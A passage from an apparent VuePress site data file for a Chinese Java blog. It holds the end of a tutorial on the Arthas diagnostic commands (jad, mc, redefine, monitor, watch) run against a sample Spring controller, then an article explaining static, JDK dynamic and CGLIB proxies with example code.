org.springframework.web.bind.annotation.requestmapping\n *  org.springframework.web.bind.annotation.requestparam\n *  org.springframework.web.bind.annotation.restcontroller\n */\npackage com.cloud.mqtt.web;\n\nimport com.cloud.mqtt.web.mqttgateway;\nimport javax.annotation.resource;\nimport org.springframework.web.bind.annotation.getmapping;\nimport org.springframework.web.bind.annotation.requestmapping;\nimport org.springframework.web.bind.annotation.requestparam;\nimport org.springframework.web.bind.annotation.restcontroller;\n\n@restcontroller\n@requestmapping(value={"/test"})\npublic class testcontroller {\n    @resource\n    private mqttgateway mqttgateway;\n\n    @getmapping(value={"/"})\n    public string test(string a, string b) {\n        string rt = a + b;\n        return rt;\n    }\n\n    @getmapping(value={"/send"})\n    public string sendmqtt(@requestparam(value="data") string data, @requestparam(value="topic") string topic) {\n        string rt = "sendmqtt";\n        return rt;\n    }\n\n    @getmapping(value={"/sendtest"})\n    public string sendtest(@requestparam(value="data") string data, @requestparam(value="topic") string topic) {\n        string rt = "sendmqtt";\n        return "ok";\n    }\n}\n\naffect(row-cnt:1) cost in 394 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n示例：反编译 com.cloud.mqtt.web.testcontroller test 方法\n\n$ jad com.cloud.mqtt.web.testcontroller test\n\nclassloader:                                                                                                                                                                                                                            \n+-org.springframework.boot.loader.launchedurlclassloader@439f5b3d                                                                                                                                                                       \n  +-jdk.internal.loader.classloaders$appclassloader@5bc2b487                                                                                                                                                                            \n    +-jdk.internal.loader.classloaders$platformclassloader@75d2da2d                                                                                                                                                                     \n\nlocation:                                                                                                                                                                                                                               \nfile:/home/fengqianrun/opt/server/mqtt-0.0.1.jar!/boot-inf/classes!/                                                                                                                                                                    \n\n@getmapping(value={"/"})\npublic string test(string a, string b) {\n    string rt = a + b;\n    return rt;\n}\n\naffect(row-cnt:1) cost in 67 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# mc\n\n内存编译器，编译.java 文件生成.class 文件。编译生成.class 之后们，可以节后 redefine 命令实现热更新代码。\n参数说明：[c:]（指定 classloader），[d]（指定输出目录）\n\nmc /tmp/test.java 编译test.java文件\nmc -c 327a647b /tmp/test.java 指定classloader编译\nmc -d /tmp/output /tmp/classa.java /tmp/classb.java 编译到指定目录\n\n\n1\n2\n3\n\n\n\n# redefine\n\n加载外部的 .class 文件到 redefine jvm 已加载的类。\nredefine 后的原来的类不能恢复，redefine 有可能失败（比如增加了新的 field），参考 jdk 本身的文档。\n参数说明：[c:]（classloader 的 hashcode），[p:]（外部的.class 文件的完整路径，支持多个）\n\nredefine /tmp/test.class\n结合 jad/mc 命令使用：\njad --source-only com.example.demo.arthas.user.usercontroller > /tmp/usercontroller.java\nmc /tmp/usercontroller.java -d /tmp\nredefine /tmp/com/example/demo/arthas/user/usercontroller.class\n- jad命令反编译，然后可以用其它编译器，比如vim来修改源码\n- mc命令来内存编译修改过的代码\n- 用redefine命令加载新的字节码\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nredefine 的限制，不允许新增加 field/method，正在跑的函数，没有退出不能生效，比如下面新增加的 system.out.println，只有 run () 函数里的会生效。\n\n\n# monitor\n\nmonitor 方法监控执行，是一个非实时得返回命令，意思就是可以一直监控某一个方法，直到你按 ctrl+c 结束为止。\n监控得信息包括：timestamp (时间戳)，class（java 类），method（方法，包括构造方法和普通方法），total（调用次数），success（成功次数），fail（失败次数），rt（平均 rt），fail-rate（失败率）。\n方法参数说明：class（包名 + 类名），method（方法名），[e]（开启正则表达匹配，默认通配符），[c:]（得到运行报告得间隔时间，默认是 120 秒）\n\n$ monitor -c 5 com.cloud.mqtt.web.testcontroller test\npress q or ctrl+c to abort.\naffect(class-cnt:1 , method-cnt:1) cost in 60 ms.\n timestamp            class                              method  total  success  fail  avg-rt(ms)  fail-rate                                                                                                                            \n-------------------------------------------------------------------------------------------------------------                                                                                                                           \n 2019-08-19 14:29:03  com.cloud.mqtt.web.testcontroller  test    6      6        0     0.34        0.00%                                                                                                                                \n\n timestamp            class                              method  total  success  fail  avg-rt(ms)  fail-rate                                                                                                                            \n-------------------------------------------------------------------------------------------------------------                                                                                                                           \n 2019-08-19 14:29:08  com.cloud.mqtt.web.testcontroller  test    1      1        0     0.09        0.00%                                                                                                                                \n\n timestamp            class                              method  total  success  fail  avg-rt(ms)  fail-rate                                                                                                                            \n-------------------------------------------------------------------------------------------------------------                                                                                                                           \n 2019-08-19 14:29:13  com.cloud.mqtt.web.testcontroller  test    0      0        0     0.00        0.00%                                                                                                                                \n\n timestamp            class                              method  total  success  fail  avg-rt(ms)  fail-rate                                                                                                                            \n-------------------------------------------------------------------------------------------------------------                                                                                                                           \n 2019-08-19 14:29:18  com.cloud.mqtt.web.testcontroller  test    0      0        0     0.00        0.00%            \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n我得类 com.cloud.mqtt.web.testcontroller ，方法为 test ，-c 5 得意思就是每 5 秒打印一次。\n\n\n# watch\n\nwatch 方法执行数据观测。\n参数说明：class（类名表达式匹配），method（方法名表达式匹配），express（观察表达式），condition-express（条件表达式），[b]（在方法调用之前观察），[e]（在方法异常之后观察），[s]（在方法返回之后观察），[f]（在方法结束之后 (正常返回和异常返回) 观察），[e]（开启正则表达式匹配，默认为通配符匹配），[x:]（指定输出结果的属性遍历深度，默认为 1）\n特别说明：\n\n * watch 命令定义了 4 个观察事件点，即 -b 方法调用前，-e 方法异常后，-s 方法返回后，-f 方法结束后\n * 4 个观察事件点 -b、-e、-s 默认关闭，-f 默认打开，当指定观察点被打开后，在相应事件点会对观察表达式进行求值并输出\n * 这里要注意方法入参和方法出参的区别，有可能在中间被修改导致前后不一致，除了 -b 事件点 params 代表方法入参外，其余事件都代表方法出参\n * 当使用 -b 时，由于观察事件点是在方法调用前，此时返回值或异常均不存在\n\ncurl "http://192.168.15.130:8087/test/?a=1&b=3" ，-x 2的意思是，是否深度解析参数，如果你的参数是一个对象，不深度解析，你看到的只是对象地址，深度解析的值，跟你参数所嵌套层数有关。\n$ watch com.cloud.mqtt.web.testcontroller  test "{params,returnobj}" -x 2\npress q or ctrl+c to abort.\naffect(class-cnt:1 , method-cnt:1) cost in 41 ms.\nts=2019-08-19 17:02:09; [cost=0.241819ms] result=@arraylist[\n    @object[][\n        @string[1],\n        @string[3],\n    ],\n    @string[13],\n]\n\n-b 意思是解析入参，-s解析出参， -n 2执行两次的意思，2次完则结束。结果的输出顺序和事件发生的先后顺序一致，和命令中 -s -b 的顺序无关。\n$ watch com.cloud.mqtt.web.testcontroller  test "{params,returnobj}" -x 2 -b  -s -n 2\npress q or ctrl+c to abort.\naffect(class-cnt:1 , method-cnt:1) cost in 46 ms.\nts=2019-08-19 17:06:21; [cost=0.006941ms] result=@arraylist[\n    @object[][\n        @string[1],\n        @string[3],\n    ],\n    null,\n]\nts=2019-08-19 17:06:21; [cost=0.945661ms] result=@arraylist[\n    @object[][\n        @string[1],\n        @string[3],\n    ],\n    @string[13],\n]\ncommand execution times exceed limit: 2, so command will exit. you can set it with -n option.\n\n条件表达式，第一个传参大于5才执行\n$ watch com.cloud.mqtt.web.testcontroller  test "{params[0],returnobj}" "params[0] > 5"\npress q or ctrl+c to abort.\naffect(class-cnt:1 , method-cnt:1) cost in 39 ms.\nts=2019-08-19 17:21:58; [cost=0.183399ms] result=@arraylist[\n    @string[6],\n    @string[63],\n]\n\n异常信息举例：-e 表示抛出异常时才触发，express中，表示异常信息的变量是throwexp\n$ watch demo.mathgame primefactors "{params[0],throwexp}" -e -x 2\npress ctrl+c to abort.\naffect(class-cnt:1 , method-cnt:1) cost in 62 ms.\nts=2018-12-03 19:38:00; [cost=1.414993ms] result=@arraylist[\n    @integer[-1120397038],\n    java.lang.illegalargumentexception: number is: -1120397038, need >= 2\n    at demo.mathgame.primefactors(mathgame.java:46)\n    at demo.mathgame.run(mathgame.java:24)\n    at demo.mathgame.main(mathgame.java:16),\n]\n\n按照耗时进行过滤：#cost>200(单位是ms)表示只有当耗时大于200ms时才会输出，过滤掉执行时间小于200ms的调用\n$ watch demo.mathgame primefactors \'{params, returnobj}\' \'#cost>200\' -x 2\n$ watch demo.mathgame primefactors \'{params, returnobj}\' \'#cost>200\' -x 2\npress ctrl+c to abort.\naffect(class-cnt:1 , method-cnt:1) cost in 66 ms.\nts=2018-12-03 19:40:28; [cost=2112.168897ms] result=@arraylist[\n    @object[][\n        @integer[2141897465],\n    ],\n    @arraylist[\n        @integer[5],\n        @integer[428379493],\n    ],\n]\n\n观察当前对象中的属性：如果想查看方法运行前后，当前对象中的属性，可以使用target关键字，代表当前对象，然后使用target.field_name访问当前对象的某个属性\n$ watch com.cloud.mqtt.web.testcontroller  test \'target\'\npress q or ctrl+c to abort.\naffect(class-cnt:1 , method-cnt:1) cost in 47 ms.\nts=2019-08-19 17:27:09; [cost=0.450697ms] result=@testcontroller[\n    mqttgateway=@$proxy65[gateway proxy for service interface [interface com.cloud.mqtt.web.mqttgateway]],\n]\n\n$ watch com.cloud.mqtt.web.testcontroller  test \'target.mqttgateway\'\npress q or ctrl+c to abort.\naffect(class-cnt:1 , method-cnt:1) cost in 46 ms.\nts=2019-08-19 17:28:31; [cost=0.352704ms] result=@$proxy65[\n    m1=@method[public boolean java.lang.object.equals(java.lang.object)],\n    m10=@method[public abstract boolean org.springframework.aop.framework.advised.isexposeproxy()],\n    m13=@method[public abstract void org.springframework.aop.framework.advised.addadvisor(org.springframework.aop.advisor) throws org.springframework.aop.framework.aopconfigexception],\n    m7=@method[public abstract boolean org.springframework.aop.framework.advised.isproxytargetclass()],\n    m15=@method[public abstract void org.springframework.aop.framework.advised.removeadvisor(int) throws org.springframework.aop.framework.aopconfigexception],\n    m23=@method[public abstract java.lang.class[] org.springframework.aop.framework.advised.getproxiedinterfaces()],\n    m5=@method[public abstract int org.springframework.aop.framework.advised.indexof(org.springframework.aop.advisor)],\n    m22=@method[public abstract org.springframework.aop.targetsource org.springframework.aop.framework.advised.gettargetsource()],\n    m18=@method[public abstract void org.springframework.aop.framework.advised.addadvice(int,org.aopalliance.aop.advice) throws org.springframework.aop.framework.aopconfigexception],\n    m19=@method[public abstract void org.springframework.aop.framework.advised.addadvice(org.aopalliance.aop.advice) throws org.springframework.aop.framework.aopconfigexception],\n    m0=@method[public native int java.lang.object.hashcode()],\n    m24=@method[public abstract boolean org.springframework.aop.framework.advised.isinterfaceproxied(java.lang.class)],\n    m20=@method[public abstract boolean org.springframework.aop.framework.advised.removeadvice(org.aopalliance.aop.advice)],\n    m9=@method[public abstract void org.springframework.aop.framework.advised.setexposeproxy(boolean)],\n    m8=@method[public abstract void org.springframework.aop.framework.advised.settargetsource(org.springframework.aop.targetsource)],\n    m2=@method[public java.lang.string java.lang.object.tostring()],\n    m26=@method[public abstract java.lang.class org.springframework.aop.targetclassaware.gettargetclass()],\n    m14=@method[public abstract void org.springframework.aop.framework.advised.addadvisor(int,org.springframework.aop.advisor) throws org.springframework.aop.framework.aopconfigexception],\n    m27=@method[public abstract java.lang.class org.springframework.core.decoratingproxy.getdecoratedclass()],\n    m16=@method[public abstract boolean org.springframework.aop.framework.advised.removeadvisor(org.springframework.aop.advisor)],\n    m4=@method[public abstract int org.springframework.aop.framework.advised.indexof(org.aopalliance.aop.advice)],\n    m6=@method[public abstract boolean org.springframework.aop.framework.advised.isfrozen()],\n    m17=@method[public abstract boolean org.springframework.aop.framework.advised.replaceadvisor(org.springframework.aop.advisor,org.springframework.aop.advisor) throws org.springframework.aop.framework.aopconfigexception],\n    m11=@method[public abstract void org.springframework.aop.framework.advised.setprefiltered(boolean)],\n    m3=@method[public abstract void com.cloud.mqtt.web.mqttgateway.sendtomqtt(java.lang.string,java.lang.string)],\n    m21=@method[public abstract java.lang.string org.springframework.aop.framework.advised.toproxyconfigstring()],\n    m25=@method[public abstract org.springframework.aop.advisor[] org.springframework.aop.framework.advised.getadvisors()],\n    m12=@method[public abstract boolean org.springframework.aop.framework.advised.isprefiltered()],\n]\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n',charsets:{cjk:!0}},{title:"代理模式",frontmatter:{title:"代理模式",date:"2023-06-25T09:22:36.000Z",permalink:"/language/mode/1/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/03.%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.html",relativePath:"00.语言/03.设计模式/1.设计模式.md",key:"v-394fe5d6",path:"/language/mode/1/",headers:[{level:3,title:"静态代理",slug:"静态代理",normalizedTitle:"静态代理",charIndex:125},{level:3,title:"动态代理",slug:"动态代理",normalizedTitle:"动态代理",charIndex:130},{level:5,title:"JDK代理",slug:"jdk代理",normalizedTitle:"jdk 代理",charIndex:2149},{level:5,title:"CGLIB代理",slug:"cglib代理",normalizedTitle:"cglib 代理",charIndex:3929},{level:5,title:"区别",slug:"区别",normalizedTitle:"区别",charIndex:5459}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"静态代理 动态代理 JDK代理 CGLIB代理 区别",content:'Java 中的代理是一种设计模式，它允许在不改变原始对象的情况下，通过引入一个代理对象来控制对原始对象的访问。代理对象充当了客户端与原始对象之间的中介，可以在调用原始对象的方法前后执行一些额外的操作，如权限检查、日志记录等。\n\nJava 的代理主要有静态代理和动态代理两种实现方式。静态代理需要手动编写代理类，而动态代理则使用 Java 提供的反射机制动态生成代理对象。\n\n代理的作用包括：\n\n * 控制对原始对象的访问：代理对象可以限制客户端对原始对象的直接访问，从而增加安全性。\n * 实现远程调用：代理对象可以将方法调用转发到另一台计算机上的对象，从而实现远程调用。\n * 实现懒加载：代理对象可以在需要时才创建原始对象，从而实现懒加载，提高系统性能。\n * 实现事务管理：代理对象可以在调用原始对象的方法前后进行事务操作，从而实现事务管理。\n\n\n# 静态代理\n\n在静态代理中，代理类和原始类实现了相同的接口，客户端通过代理类访问原始类的方法。\n\n使用 Java 静态代理有以下几个步骤：\n\n 1. 创建一个接口，定义原始对象和代理对象都要实现的方法；\n 2. 创建一个原始对象的实现类，并实现接口中的方法；\n 3. 创建一个代理类，实现接口并持有原始对象的引用；\n 4. 在代理类的方法中，调用原始对象的方法，并在调用前后执行需要的额外操作；\n 5. 在客户端代码中，创建一个代理对象，调用代理对象的方法即可。\n\n// 接口\npublic interface Subject {\n    void request();\n}\n\n// 原始对象\npublic class RealSubject implements Subject {\n    public void request() {\n        System.out.println("RealSubject: Handling request.");\n    }\n}\n\n// 代理类\npublic class Proxy implements Subject {\n    private RealSubject realSubject;\n    \n    public Proxy(RealSubject realSubject) {\n        this.realSubject = realSubject;\n    }\n    \n    public void request() {\n        System.out.println("Proxy: Logging before request.");\n        realSubject.request();\n        System.out.println("Proxy: Logging after request.");\n    }\n}\n\n// 客户端代码\npublic class Client {\n    public static void main(String[] args) {\n        RealSubject realSubject = new RealSubject();\n        Proxy proxy = new Proxy(realSubject);\n        proxy.request();\n    }\n}\n// 结果\nProxy: Logging before request.\nRealSubject: Handling request.\nProxy: Logging after request.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# 动态代理\n\nJava 动态代理是一种使用反射机制在运行时动态地生成代理类的技术，可以用来代理一个或多个接口的实现类，并在代理对象调用方法时进行额外的操作。\n\nJava 动态代理有两种实现方式：基于接口的动态代理（JDK）和基于类的动态代理（CGLIB）。\n\n * 基于接口的动态代理（JDK）：是指代理对象实现（或继承）了被代理对象实现的接口，代理对象通过接口中的方法来实现对被代理对象的代理。这种方式更灵活、安全和低耦合，因为代理对象和被代理对象之间只需要共同实现一个接口即可。\n * 而基于类的动态代理（CGLIB）：是指代理对象和被代理对象没有共同实现的接口，但代理对象是被代理对象的子类，因此可以覆盖被代理对象的方法并在其中实现对被代理对象的代理。这种方式相对于基于接口的动态代理来说更灵活，因为代理对象不受被代理对象的接口限制，可以代理任意类的任意方法，但是它也带来了一些问题，例如代理对象无法同时代理多个类，以及可能会破坏被代理对象的封装性和安全性。\n\nJava 动态代理的作用包括但不限于：\n\n * 实现 AOP（面向切面编程）的功能，如日志记录、性能统计等；\n * 隐藏某些类或方法的具体实现细节；\n * 实现 RPC（远程过程调用）等功能。\n\n# JDK 代理\n\n使用 Java 动态代理需要遵循以下步骤：\n\n 1. 定义一个接口；\n 2. 编写一个实现该接口的类；\n 3. 创建一个 InvocationHandler 对象，并实现 invoke () 方法，在该方法中对被代理对象的方法进行增强；\n 4. 通过 Proxy.newProxyInstance () 方法创建代理对象。该方法需要传入三个参数：ClassLoader 对象、代理对象要实现的接口数组、InvocationHandler 对象；\n 5. 调用代理对象的方法，实际上会调用 InvocationHandler 的 invoke () 方法。\n\n// 接口\npublic interface Subject {\n    void request();\n}\n\n// 实现类\npublic class RealSubject implements Subject {\n    public void request() {\n        System.out.println("RealSubject: Handling request.");\n    }\n}\n\n// InvocationHandler\npublic class MyInvocationHandler implements InvocationHandler {\n    private Object realObject;\n    \n    public MyInvocationHandler(Object realObject) {\n        this.realObject = realObject;\n    }\n\n    @Override\n    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n        System.out.println("MyInvocationHandler: Logging before request.");\n        Object result = method.invoke(realObject, args);\n        System.out.println("MyInvocationHandler: Logging after request.");\n        return result;\n    }\n}\n\n// 客户端代码\npublic class Client {\n    public static void main(String[] args) {\n        RealSubject realSubject = new RealSubject();\n        MyInvocationHandler handler = new MyInvocationHandler(realSubject);\n        // 创建代理对象\n        Subject proxy = (Subject)Proxy.newProxyInstance(\n            realSubject.getClass().getClassLoader(),\n            realSubject.getClass().getInterfaces(),\n            handler);\n        // 调用代理对象的方法\n        proxy.request();\n    }\n}\n// 结果\nMyInvocationHandler: Logging before request.\nRealSubject: Handling request.\nMyInvocationHandler: Logging after request.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n# CGLIB 代理\n\nCGLIB 是一个强大的 Java 字节码生成库，能够在运行时动态地生成代理对象。与基于接口的动态代理不同，CGLIB 动态代理可以代理没有实现接口的类。\n\n使用 CGLIB 动态代理需要依赖 cglib 库，可以通过 Maven 等构建工具引入。下面是一个简单的使用 CGLIB 动态代理的示例：\n\n 1. 定义一个需要代理的类 Person，并定义其相关方法。\n\npublic class Person {\n    public void eat() {\n        System.out.println("Person: Eating");\n    }\n\n    public void sleep() {\n        System.out.println("Person: Sleeping");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 2. 创建一个 MethodInterceptor 对象，在 intercept () 方法中实现对被代理对象方法的增强。\n\nimport net.sf.cglib.proxy.MethodInterceptor;\nimport net.sf.cglib.proxy.MethodProxy;\n\nimport java.lang.reflect.Method;\n\npublic class MyMethodInterceptor implements MethodInterceptor {\n    @Override\n    public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable {\n        System.out.println("Before " + method.getName());\n        Object result = proxy.invokeSuper(obj, args);\n        System.out.println("After " + method.getName());\n        return result;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n 3. 使用 CGLIB 创建代理对象，并调用代理对象的方法。\n\nimport net.sf.cglib.proxy.Enhancer;\n\npublic class Main {\n    public static void main(String[] args) {\n        Enhancer enhancer = new Enhancer();\n        enhancer.setSuperclass(Person.class);\n        enhancer.setCallback(new MyMethodInterceptor());\n\n        Person person = (Person)enhancer.create();\n        person.eat();\n        person.sleep();\n    }\n}\n// 结果\nBefore eat\nPerson: Eating\nAfter eat\nBefore sleep\nPerson: Sleeping\nAfter sleep\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# 区别\n\n基于 CGLIB 和 JDK 动态代理各有优缺点，取决于具体的应用场景和需求。具体优缺点如下：\n优点：\n\nCGLIB                      JDK\n可以代理没有实现接口的类               不需要依赖额外的库\n生成的代理类比较小，执行效率高            采用的是接口代理，更加灵活和安全\n支持方法级别的拦截，可以对类中的任意方法进行拦截   在 Java 1.3 及以上版本中可以直接使用，易于部署和维护\n\n缺点：\n\nCGLIB                           JDK\n对于 final 方法或 private 方法无法进行代理   只能代理实现了接口的类\n由于使用继承实现代理，可能会破坏被代理对象的封装性和安全性   生成的代理类相对较大，执行效率不如基于 Java 字节码生成库的代理\n生成的代理类需要依赖额外的库                  只能对接口中的方法进行拦截',normalizedContent:'java 中的代理是一种设计模式，它允许在不改变原始对象的情况下，通过引入一个代理对象来控制对原始对象的访问。代理对象充当了客户端与原始对象之间的中介，可以在调用原始对象的方法前后执行一些额外的操作，如权限检查、日志记录等。\n\njava 的代理主要有静态代理和动态代理两种实现方式。静态代理需要手动编写代理类，而动态代理则使用 java 提供的反射机制动态生成代理对象。\n\n代理的作用包括：\n\n * 控制对原始对象的访问：代理对象可以限制客户端对原始对象的直接访问，从而增加安全性。\n * 实现远程调用：代理对象可以将方法调用转发到另一台计算机上的对象，从而实现远程调用。\n * 实现懒加载：代理对象可以在需要时才创建原始对象，从而实现懒加载，提高系统性能。\n * 实现事务管理：代理对象可以在调用原始对象的方法前后进行事务操作，从而实现事务管理。\n\n\n# 静态代理\n\n在静态代理中，代理类和原始类实现了相同的接口，客户端通过代理类访问原始类的方法。\n\n使用 java 静态代理有以下几个步骤：\n\n 1. 创建一个接口，定义原始对象和代理对象都要实现的方法；\n 2. 创建一个原始对象的实现类，并实现接口中的方法；\n 3. 创建一个代理类，实现接口并持有原始对象的引用；\n 4. 在代理类的方法中，调用原始对象的方法，并在调用前后执行需要的额外操作；\n 5. 在客户端代码中，创建一个代理对象，调用代理对象的方法即可。\n\n// 接口\npublic interface subject {\n    void request();\n}\n\n// 原始对象\npublic class realsubject implements subject {\n    public void request() {\n        system.out.println("realsubject: handling request.");\n    }\n}\n\n// 代理类\npublic class proxy implements subject {\n    private realsubject realsubject;\n    \n    public proxy(realsubject realsubject) {\n        this.realsubject = realsubject;\n    }\n    \n    public void request() {\n        system.out.println("proxy: logging before request.");\n        realsubject.request();\n        system.out.println("proxy: logging after request.");\n    }\n}\n\n// 客户端代码\npublic class client {\n    public static void main(string[] args) {\n        realsubject realsubject = new realsubject();\n        proxy proxy = new proxy(realsubject);\n        proxy.request();\n    }\n}\n// 结果\nproxy: logging before request.\nrealsubject: handling request.\nproxy: logging after request.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# 动态代理\n\njava 动态代理是一种使用反射机制在运行时动态地生成代理类的技术，可以用来代理一个或多个接口的实现类，并在代理对象调用方法时进行额外的操作。\n\njava 动态代理有两种实现方式：基于接口的动态代理（jdk）和基于类的动态代理（cglib）。\n\n * 基于接口的动态代理（jdk）：是指代理对象实现（或继承）了被代理对象实现的接口，代理对象通过接口中的方法来实现对被代理对象的代理。这种方式更灵活、安全和低耦合，因为代理对象和被代理对象之间只需要共同实现一个接口即可。\n * 而基于类的动态代理（cglib）：是指代理对象和被代理对象没有共同实现的接口，但代理对象是被代理对象的子类，因此可以覆盖被代理对象的方法并在其中实现对被代理对象的代理。这种方式相对于基于接口的动态代理来说更灵活，因为代理对象不受被代理对象的接口限制，可以代理任意类的任意方法，但是它也带来了一些问题，例如代理对象无法同时代理多个类，以及可能会破坏被代理对象的封装性和安全性。\n\njava 动态代理的作用包括但不限于：\n\n * 实现 aop（面向切面编程）的功能，如日志记录、性能统计等；\n * 隐藏某些类或方法的具体实现细节；\n * 实现 rpc（远程过程调用）等功能。\n\n# jdk 代理\n\n使用 java 动态代理需要遵循以下步骤：\n\n 1. 定义一个接口；\n 2. 编写一个实现该接口的类；\n 3. 创建一个 invocationhandler 对象，并实现 invoke () 方法，在该方法中对被代理对象的方法进行增强；\n 4. 通过 proxy.newproxyinstance () 方法创建代理对象。该方法需要传入三个参数：classloader 对象、代理对象要实现的接口数组、invocationhandler 对象；\n 5. 调用代理对象的方法，实际上会调用 invocationhandler 的 invoke () 方法。\n\n// 接口\npublic interface subject {\n    void request();\n}\n\n// 实现类\npublic class realsubject implements subject {\n    public void request() {\n        system.out.println("realsubject: handling request.");\n    }\n}\n\n// invocationhandler\npublic class myinvocationhandler implements invocationhandler {\n    private object realobject;\n    \n    public myinvocationhandler(object realobject) {\n        this.realobject = realobject;\n    }\n\n    @override\n    public object invoke(object proxy, method method, object[] args) throws throwable {\n        system.out.println("myinvocationhandler: logging before request.");\n        object result = method.invoke(realobject, args);\n        system.out.println("myinvocationhandler: logging after request.");\n        return result;\n    }\n}\n\n// 客户端代码\npublic class client {\n    public static void main(string[] args) {\n        realsubject realsubject = new realsubject();\n        myinvocationhandler handler = new myinvocationhandler(realsubject);\n        // 创建代理对象\n        subject proxy = (subject)proxy.newproxyinstance(\n            realsubject.getclass().getclassloader(),\n            realsubject.getclass().getinterfaces(),\n            handler);\n        // 调用代理对象的方法\n        proxy.request();\n    }\n}\n// 结果\nmyinvocationhandler: logging before request.\nrealsubject: handling request.\nmyinvocationhandler: logging after request.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n# cglib 代理\n\ncglib 是一个强大的 java 字节码生成库，能够在运行时动态地生成代理对象。与基于接口的动态代理不同，cglib 动态代理可以代理没有实现接口的类。\n\n使用 cglib 动态代理需要依赖 cglib 库，可以通过 maven 等构建工具引入。下面是一个简单的使用 cglib 动态代理的示例：\n\n 1. 定义一个需要代理的类 person，并定义其相关方法。\n\npublic class person {\n    public void eat() {\n        system.out.println("person: eating");\n    }\n\n    public void sleep() {\n        system.out.println("person: sleeping");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 2. 创建一个 methodinterceptor 对象，在 intercept () 方法中实现对被代理对象方法的增强。\n\nimport net.sf.cglib.proxy.methodinterceptor;\nimport net.sf.cglib.proxy.methodproxy;\n\nimport java.lang.reflect.method;\n\npublic class mymethodinterceptor implements methodinterceptor {\n    @override\n    public object intercept(object obj, method method, object[] args, methodproxy proxy) throws throwable {\n        system.out.println("before " + method.getname());\n        object result = proxy.invokesuper(obj, args);\n        system.out.println("after " + method.getname());\n        return result;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n 3. 使用 cglib 创建代理对象，并调用代理对象的方法。\n\nimport net.sf.cglib.proxy.enhancer;\n\npublic class main {\n    public static void main(string[] args) {\n        enhancer enhancer = new enhancer();\n        enhancer.setsuperclass(person.class);\n        enhancer.setcallback(new mymethodinterceptor());\n\n        person person = (person)enhancer.create();\n        person.eat();\n        person.sleep();\n    }\n}\n// 结果\nbefore eat\nperson: eating\nafter eat\nbefore sleep\nperson: sleeping\nafter sleep\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# 区别\n\n基于 cglib 和 jdk 动态代理各有优缺点，取决于具体的应用场景和需求。具体优缺点如下：\n优点：\n\ncglib                      jdk\n可以代理没有实现接口的类               不需要依赖额外的库\n生成的代理类比较小，执行效率高            采用的是接口代理，更加灵活和安全\n支持方法级别的拦截，可以对类中的任意方法进行拦截   在 java 1.3 及以上版本中可以直接使用，易于部署和维护\n\n缺点：\n\ncglib                           jdk\n对于 final 方法或 private 方法无法进行代理   只能代理实现了接口的类\n由于使用继承实现代理，可能会破坏被代理对象的封装性和安全性   生成的代理类相对较大，执行效率不如基于 java 字节码生成库的代理\n生成的代理类需要依赖额外的库                  只能对接口中的方法进行拦截',charsets:{cjk:!0}},{title:"核心内容拆解 IOC",frontmatter:{title:"核心内容拆解 